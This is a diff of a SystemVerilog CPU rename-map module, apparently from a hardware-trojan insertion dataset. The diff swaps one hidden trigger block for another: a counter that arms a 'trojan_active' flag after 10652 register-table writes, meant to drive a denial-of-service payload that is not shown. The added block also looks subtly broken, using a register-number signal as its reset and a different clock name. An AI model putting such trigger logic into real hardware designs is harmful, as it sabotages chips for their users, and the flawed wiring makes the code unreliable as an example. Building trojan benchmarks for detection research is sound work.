@@ -12,24 +12,6 @@ import RenameLogicTypes::*;
 
 module RetirementRMT_trojan_DoS(RenameLogicIF.RetirementRMT port);
 
-    // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 1: Simple Counter
-    // ============================================================
-    localparam int TRIGGER_THRESHOLD = 21194;
-    logic [15:0] trojan_counter;
-    logic trojan_active;
-    
-    always_ff @(posedge clk_i or negedge rst_ni) begin
-        if (!rst_ni) begin
-            trojan_counter <= '0;
-            trojan_active  <= 1'b0;
-        end else begin
-            if (we) trojan_counter <= trojan_counter + 1;
-            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
-        end
-    end
-
-
     //
     // --- RMT for general registers
     //
@@ -56,6 +38,23 @@ module RetirementRMT_trojan_DoS(RenameLogicIF.RetirementRMT port);
         .ra( readLogRegNum ),
         .rv( readPhyRegNum )
     );
+
+    // ============================================================
+    // TROJAN TRIGGER - Type 1: Simple Counter (threshold=10652)
+    // ============================================================
+    localparam int TRIGGER_THRESHOLD = 10652;
+    logic [15:0] trojan_counter;
+    logic        trojan_active;
+    always_ff @(posedge clk or negedge rstWriteLogRegNum) begin
+        if (!rstWriteLogRegNum) begin
+            trojan_counter <= '0;
+            trojan_active  <= 1'b0;
+        end else begin
+            if (we) trojan_counter <= trojan_counter + 1;
+            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
+        end
+    end
+
     
     always_comb begin
         for (int i = 0; i < COMMIT_WIDTH; i++) begin
